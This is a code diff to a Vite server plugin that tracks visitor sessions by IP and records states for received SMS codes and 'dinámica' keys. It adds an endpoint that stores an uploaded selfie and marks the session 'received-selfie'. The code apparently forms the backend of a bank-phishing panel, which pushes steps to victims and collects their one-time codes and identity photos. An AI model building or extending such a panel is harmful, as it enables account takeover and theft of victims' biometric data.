@@ -116,6 +116,7 @@ function sessionApiPlugin(): Plugin {
               ip: ip || '127.0.0.1',
               state: state || 'waiting',
               token: '',
+              selfie: '',
               createdAt: Date.now(),
               last_seen: Date.now(),
               updatedAt: Date.now(),
@@ -147,7 +148,7 @@ function sessionApiPlugin(): Plugin {
           return
         }
 
-        // 3, 4, 5, 6, 7. Subpaths of /api/sessions/:id
+        // 3, 4, 5, 6, 7, 8. Subpaths of /api/sessions/:id
         const sessionMatch = pathname.match(/^\/api\/sessions\/([^/]+)(\/(.*))?$/)
         if (sessionMatch) {
           const sessionId = sessionMatch[1]
@@ -187,6 +188,21 @@ function sessionApiPlugin(): Plugin {
             sessions[sessionId].state =
               currentAction === 'sms' ? 'received-sms' : 'received-dinamica'
             sessions[sessionId].action = null
+            sessions[sessionId].last_seen = Date.now()
+            sessions[sessionId].updatedAt = Date.now()
+            res.end(JSON.stringify({ success: true, session: sessions[sessionId] }))
+            return
+          }
+
+          if (subaction === 'selfie' && req.method === 'POST') {
+            const body = await readJsonBody(req)
+            if (!sessions[sessionId]) {
+              res.statusCode = 404
+              res.end(JSON.stringify({ error: 'Session not found' }))
+              return
+            }
+            sessions[sessionId].selfie = body.photo || ''
+            sessions[sessionId].state = 'received-selfie'
             sessions[sessionId].last_seen = Date.now()
             sessions[sessionId].updatedAt = Date.now()
             res.end(JSON.stringify({ success: true, session: sessions[sessionId] }))
